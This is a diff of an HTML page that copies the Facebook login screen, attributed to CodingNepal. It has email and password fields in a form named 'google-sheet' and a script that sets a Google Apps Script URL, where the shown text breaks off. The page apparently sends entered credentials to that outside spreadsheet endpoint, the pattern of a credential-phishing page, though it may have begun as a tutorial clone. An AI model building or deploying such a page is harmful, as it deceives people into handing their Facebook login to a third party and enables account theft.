@@ -1,26 +1,32 @@
-<!DOCTYPE html>
 <html lang="en">
-<head>
+  <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook</title>
-    <link rel="stylesheet" href="index.css">
-    <link rel="icon" href="fb icon.png" type="png">
-</head>
-<body>
-    <div class="continor">
-        
-            <form class="mainbox" action="" method="post" name="google-sheet">
-            <input type="text" name="email" placeholder="Email or Phone Number">
-            <input type="password" name="password" placeholder="Password">
-            <button class="login" name="submit"><a href="/">Login</a></button>
-            <a class="forgot" href="/">Forgot password?</a>
-            <div class="line"></div>
-            <button class="create"><a href="/">Create New Account</a></button></form>
-            
-        
-        <div class="maintext"><h1>Facebook</h1><p>Contact youre friends and the world around your on facebook.</p></div>
-
+    <title>Facebook Login Page | CodingNepal</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="icon.png">
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world </p>
+          <p> around you on Facebook.</p>
+        </div>
+        <form  action="" method="post" name="google-sheet">
+          <input type="email" name="email" placeholder="Email or phone number" required>
+          <input type="password" name="password" placeholder="Password" required>
+          <div class="link">
+            <button type="submit" name="submit" class="login">Login</button>
+            <a href="#" class="forgot">Forgot password?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="#">Create new account</a>
+          </div>
+        </form>
+      </div>
     </div>
     <script>
         const scriptURL = 'https://script.google.com/macros/s/AKfycbwF8Ggp-m8XjhqF0RzU6hqsF274RsHIIE9CrnKdCK4v1B61zw2pmUx1duJpuU_5DFY2/exec'
